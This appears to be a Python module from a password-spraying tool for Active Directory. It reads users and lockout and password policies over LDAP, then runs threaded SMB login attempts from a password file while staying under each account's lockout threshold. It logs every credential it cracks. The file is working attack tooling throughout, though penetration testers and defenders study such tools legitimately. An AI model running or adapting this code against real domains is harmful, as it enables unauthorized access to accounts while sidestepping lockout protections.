import datetime
import os
import queue
import signal
import threading
from queue import Queue
import time
import socket
from rich.console import Console
from rich.progress import Progress


from conpass.ldapconnection import LdapConnection
from conpass.password import Password
from conpass.user import USER_STATUS
from conpass.session import Session

lock = threading.RLock()


class QueueProgress:
    processing = "[green] Processing password file..."
    waiting = "[green] Waiting for new passwords..."

    def __init__(self):
        self.progress = Progress()
        self.task = self.progress.add_task(QueueProgress.waiting, total=0)
        self.progress.start()

    def add_password(self):
        self.progress.update(self.task, total=self.progress.tasks[self.task].total + 1)
        if self.progress.tasks[self.task].description == QueueProgress.waiting:
            self.progress.update(self.task, description=QueueProgress.processing)

    def task_done(self):
        self.progress.update(self.task, advance=1)
        if self.progress.tasks[self.task].completed == self.progress.tasks[self.task].total:
            self.progress.update(self.task, description=QueueProgress.waiting)

    def stop(self):
        self.progress.stop()


class Worker(threading.Thread):
    def __init__(self, testing_q, test_user_lock, ldapconnection, smbconnection, queue_progress, security_threshold=1):
        super().__init__()
        self.testing_q = testing_q
        self.test_user_lock = test_user_lock
        self.ldapconnection = ldapconnection
        self.smbconnection = smbconnection
        self.console = self.ldapconnection.console
        self.queue_progress = queue_progress
        self.security_threshold = security_threshold

    def run(self):
        if not self.ldapconnection.login():
            exit(1)
        if not self.smbconnection.get_session():
            exit(1)
        while True:
            try:
                user, password = self.testing_q.get(timeout=0.1)
            except queue.Empty as e:
                time.sleep(0.1)
                continue

            with lock:
                if user.samaccountname in self.test_user_lock:
                    self.testing_q.put([user, password])
                    self.testing_q.task_done()
                    continue
                self.test_user_lock.append(user.samaccountname)

            should_test_password = user.should_test_password(self.security_threshold, self.ldapconnection)

            if should_test_password == USER_STATUS.FOUND:
                self.testing_q.task_done()
                self.queue_progress.task_done()
                with lock:
                    self.test_user_lock.remove(user.samaccountname)
                continue
            elif should_test_password == USER_STATUS.THRESHOLD:
                self.testing_q.put([user, password])
                self.testing_q.task_done()
                with lock:
                    self.test_user_lock.remove(user.samaccountname)
                continue

            # Can use ldapconnection instead, but no hash authentication implemented
            user_found = user.test_password(password, conn=self.smbconnection)
            if user_found:
                self.console.log(f"[green]Found: {user.samaccountname} - {password.value}[/green]")
            self.testing_q.task_done()
            self.queue_progress.task_done()
            with lock:
                self.test_user_lock.remove(user.samaccountname)

class ThreadPool:
    def __init__(self, arguments):
        signal.signal(signal.SIGINT, self.interrupt_event)
        signal.signal(signal.SIGTERM, self.interrupt_event)

        self.arguments = arguments
        self.console = Console()
        self.console.log("[yellow]This tool does its best to find the effective password policy but may be wrong. Use with caution.[/yellow]")
        self.console.log("[yellow]Emergency command:[/yellow] [red]Search-ADAccount -LockedOut | Unlock-ADAccount[/red]")
        self.progress = None
        self.info = False
        self.debug = False
        if self.arguments.v > 0:
            self.info = True
        if self.arguments.v > 1:
            self.debug = True

        # Resolve IP address from arguments.domain
        self.dc_ip = arguments.dc_ip
        if not self.dc_ip:
            try:
                self.dc_ip = socket.gethostbyname(arguments.domain)
            except socket.gaierror as e:
                self.console.log(f"Error resolving IP address from {arguments.domain}. Please specify the IP address with -dc-ip")
                exit(1)

        with self.console.status("Retrieving users and password policies...") as status:
            self.ldapconnection = LdapConnection(host=self.dc_ip, domain=arguments.domain, username=arguments.username, password=arguments.password, console=status.console, debug=self.debug)
            if not self.ldapconnection.login():
                exit(1)
            session = Session(address=self.dc_ip, target_ip=self.dc_ip, domain=arguments.domain, port=445, console=status.console, debug=self.debug).get_session()
            utc_remote_time = session.get_remote_time()
            utc_local_time = datetime.datetime.now(datetime.timezone.utc)
            time_delta = utc_local_time - utc_remote_time
            self.debug and status.console.log(f"UTC REMOTE: {utc_remote_time}")
            self.debug and status.console.log(f"UTC LOCAL: {utc_local_time}")
            self.debug and status.console.log(f"UTC DIFF: {time_delta.total_seconds()} seconds")
            if not session.login(arguments.username, arguments.password):
                exit(1)
            # Remove users with only 1 try, or <=N tries if `-S N` provided
            users = self.ldapconnection.get_users(time_delta, disabled=False)
            if not users:
                status.console.log(f"Couldn't retreive users")
                exit()
            self.users = [user for user in users if user.lockout_threshold == 0 or user.lockout_threshold > self.arguments.security_threshold]

            status.console.log(f"{len(set([user.pso.dn for user in self.users if user.readable_pso() in (1, -1)]))} PSO")
            status.console.log(f"{len(self.users)} users - {'Lockout after ' + str(self.users[0].lockout_threshold) + ' bad attempts (Will stop at ' + str(self.users[0].lockout_threshold - self.arguments.security_threshold) + ')' if self.users[0].lockout_threshold > 0 else '[red]No lockout[/red]' }")
            status.console.log(f"{len([user for user in self.users if user.readable_pso() == -1])} users with PSO that [red]can not be read[/red]")
            status.console.log(f"{len([user for user in self.users if user.readable_pso() == 1])} users with PSO that [green]can be read[/green]")
        self.threads = []
        self.max_threads = arguments.threads
        self.testing_q = Queue()
        self.test_user_lock = []
        self.tests = []
        self.all_users_found = False

    # Start the threads
    def run(self):
        threading.current_thread().name = "[Core]"

        # Check if file exists on disk
        if not os.path.isfile(self.arguments.password_file):
            self.info and self.console.log(f"File {self.arguments.password_file} does not exist Creating it...")
            # Create file
            open(self.arguments.password_file, 'a').close()

        self.progress = QueueProgress()
        # Add "rich" Progress console to each user for future logging
        for user in self.users:
            user.console = self.progress.progress.console

        # Start one Worker per thread.
        # Each Worker will retrieve some user/pass from `testing_q` queue and test them
        for i in range(self.max_threads):
            thread = Worker(
                self.testing_q,
                self.test_user_lock,
                LdapConnection(
                    host=self.dc_ip,
                    domain=self.arguments.domain,
                    username=self.arguments.username,
                    password=self.arguments.password,
                    console=self.progress.progress.console,
                    debug=self.debug
                ), smbconnection=Session(
                    address=self.dc_ip,
                    target_ip=self.dc_ip,
                    domain=self.arguments.domain,
                    port=445,
                    console=self.progress.progress.console,
                    debug=self.debug),
                queue_progress=self.progress,
                security_threshold=self.arguments.security_threshold)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()

        # Always read the password file to discover new passwords
        while True:
            try:
                with open(self.arguments.password_file) as f:
                    for password in f:
                        # Ignore blank password
                        if password.isspace():
                            continue
                        # Remove the trailing \n
                        password = Password(password.strip())
                        self.all_users_found = self.add_users_password(password, self.progress)
            except FileNotFoundError:
                pass
            if self.all_users_found:
                self.console.log(f'\n** All users passwords found! **')
                break
            time.sleep(0.1)

        # Block until all tasks are done
        self.testing_q.join()

    # Add the users/password combination to the queue
    def add_users_password(self, password, progress):
        self.all_users_found = True
        for key, user in enumerate(self.users):
            # Check if user should be tested, depending on lockout policy and PSO
            user_status = user.should_be_discarded()

            # Remove untestable users from list
            if user_status in (USER_STATUS.UNREADABLE_PSO, USER_STATUS.FOUND):
                user_status == USER_STATUS.UNREADABLE_PSO and self.info and self.progress.progress.console.log(f"Discarding {user.samaccountname}: [red]PSO unreadable. Use -f to force testing[/red]")
                del(self.users[key])
                continue
            # This account wasn't found so there's at least one account left.
            self.all_users_found = False

            # If this (user,password) wasn't already added to the test list, then it should be added
            if user_status in (USER_STATUS.TEST, USER_STATUS.PSO) and not [user, password] in self.tests:
                if user_status == USER_STATUS.PSO and user not in [test[0] for test in self.tests]:
                    self.info and self.progress.progress.console.log(f"User {user.samaccountname} has a PSO: {user.pso}")
                self.debug and self.progress.progress.console.log(f"Adding to queue {user.samaccountname} - {password.value}")
                self.testing_q.put([user, password])
                self.tests.append([user, password])
                # Add one test (user,password) to progress bar total
                progress.add_password()
        return self.all_users_found



    # Handle the interrupt signal
    def interrupt_event(self, signum, stack):
        if self.progress is not None:
            self.progress.stop()
        self.console.log(f"** Interrupted! **")
        exit()

    # Check if threads are still running
    def isRunning(self):
        return any(thread.is_alive() for thread in self.threads)
